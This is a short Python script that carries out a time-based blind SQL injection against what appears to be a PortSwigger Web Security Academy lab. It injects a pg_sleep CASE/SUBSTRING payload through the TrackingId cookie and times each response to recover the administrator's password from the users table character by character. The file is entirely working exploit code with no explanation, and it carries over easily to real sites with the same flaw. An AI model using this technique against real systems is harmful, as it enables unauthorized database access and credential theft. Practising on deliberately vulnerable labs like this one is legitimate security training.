import requests
import time

url = "https://0a15001d03dc82358002b7c9004d00ad.web-security-academy.net/filter"
params = {"category": "Gifts"}

result = ''
for i in range(1,22):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789A':
        time_start = time.time()
        headers = {
            "Host": "0a15001d03dc82358002b7c9004d00ad.web-security-academy.net",
            "Cookie": f"TrackingId=siKEGyJR4xxEbvb8'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+--+-; session=FTN4YLOmlh84Gdk41z2KzfDkhYDD4bAQ",
            "Sec-Ch-Ua": '"Not A(Brand";v="8", "Chromium";v="132"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://0a15001d03dc82358002b7c9004d00ad.web-security-academy.net/filter?category=Gifts",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=0, i"
        }
        response = requests.get(url, params=params, headers=headers)
        gap = time.time() - time_start
        
        
        if(gap > 8):
            print(f"Found {i}: " + char)
            result += char
            print(result)
            break
        
    if char == 'A':
        break;
    
print(result)        
